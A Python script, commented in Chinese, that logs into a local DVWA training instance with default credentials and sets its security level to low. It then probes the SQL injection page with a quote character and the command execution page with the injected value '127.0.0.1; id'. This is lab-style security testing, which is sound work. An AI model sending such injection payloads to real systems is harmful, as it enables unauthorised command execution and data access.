"""检查 DVWA security 设置"""
import asyncio
import sys
import re
sys.stdout.reconfigure(encoding='utf-8')

import httpx

DVWA = "http://192.168.18.131/dvwa"

async def main():
    print("=" * 60)
    print("DVWA Security 检查")
    print("=" * 60)
    
    async with httpx.AsyncClient(timeout=10, follow_redirects=True, verify=False) as c:
        # 登录
        await c.get(f"{DVWA}/login.php")
        await c.post(f"{DVWA}/login.php", data={"username": "admin", "password": "password", "Login": "Login"})
        
        # 检查当前 security
        r = await c.get(f"{DVWA}/security.php")
        print("当前 security 页面内容片段:")
        if "Security level is currently" in r.text:
            match = re.search(r'Security level is currently:\s*(\w+)', r.text)
            if match:
                print(f"  Security = {match.group(1)}")
        
        # 设置 security
        m = re.search(r"user_token'\s*value\s*=\s*'([^']+)'", r.text)
        token = m.group(1) if m else ""
        print(f"\n设置 security=low...")
        
        r = await c.post(f"{DVWA}/security.php", data={"security": "low", "seclev_submit": "Submit", "user_token": token})
        print(f"POST 状态: {r.status_code}")
        
        # 再次检查
        r = await c.get(f"{DVWA}/security.php")
        if "Security level is currently" in r.text:
            match = re.search(r'Security level is currently:\s*(\w+)', r.text)
            if match:
                print(f"  Security = {match.group(1)}")
        
        # 测试 SQLi 页面
        print("\n测试 SQLi 页面...")
        r = await c.get(f"{DVWA}/vulnerabilities/sqli/", params={"id": "1'", "Submit": "Submit"})
        if "error" in r.text.lower() and "syntax" in r.text.lower():
            print("  SQLi 页面: 有错误输出（security=low 生效）")
        else:
            print("  SQLi 页面: 无错误输出")
        
        # 测试命令注入
        print("\n测试命令注入...")
        r = await c.post(f"{DVWA}/vulnerabilities/exec/", data={"ip": "127.0.0.1; id", "submit": "submit"})
        print(f"  状态: {r.status_code}")
        print(f"  长度: {len(r.text)}")
        
        # 检查响应内容
        if "uid=" in r.text:
            print("  [!] 发现 uid= 命令执行成功！")
            # 提取
            idx = r.text.find("uid=")
            print(f"  输出: {r.text[idx:idx+200]}")
        elif "PING" in r.text:
            print("  有 PING 输出，但无命令执行结果")
        else:
            print("  未找到命令执行迹象")
            # 查看响应片段
            print(f"  响应片段: {r.text[:500]}")

if __name__ == "__main__":
    asyncio.run(main())
